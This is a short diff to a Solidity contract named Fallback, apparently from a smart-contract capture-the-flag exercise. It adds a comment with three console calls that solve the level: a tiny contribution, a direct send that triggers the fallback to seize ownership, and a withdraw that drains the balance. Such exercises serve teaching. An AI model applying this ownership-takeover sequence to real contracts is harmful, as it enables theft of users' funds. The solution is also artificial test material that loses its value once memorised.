@@ -40,3 +40,9 @@ contract Fallback {
     owner = msg.sender;
   }
 }
+
+/*
+await contract.contribute.sendTransaction({value: toWei("0.000000000000000001")})
+await contract.sendTransaction({value: toWei("0.000000000000000001")})
+await contract.withdraw()
+*/
